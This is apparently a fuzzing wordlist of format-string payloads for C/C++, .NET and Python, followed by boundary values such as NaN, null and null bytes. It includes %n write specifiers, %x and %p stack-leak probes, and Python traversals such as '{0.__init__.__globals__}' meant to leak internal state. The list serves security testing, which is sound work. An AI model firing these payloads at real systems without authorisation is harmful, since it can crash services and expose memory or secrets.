##Format String - Error (C/C++ crash/leak)##
%s%s%s%s%s
%x%x%x%x%x
%p%p%p%p%p
%n%n%n%n
%d%d%d%d%d
AAAA%08x.%08x.%08x.%08x
%s(un='%s')=%u
%*.*s
%@
%%n%%n%%n%%n
##Format String - Error (.NET)##
{0:X}
{0}{1}{2}{3}{4}
{0:D20}
##Format String - Math (.NET)##
String.Format("{0}",1337)
##Format String - Error (Python info leak)##
{0.__class__}
{0.__class__.__mro__}
{0.__init__.__globals__}
%(test)s
{.__class__.__init__.__globals__}
##Format String - Error (Overflow/Boundary)##

NaN
Infinity
-Infinity
undefined
null
nil
NIL
(null)
true
false
\0
\x00
%00
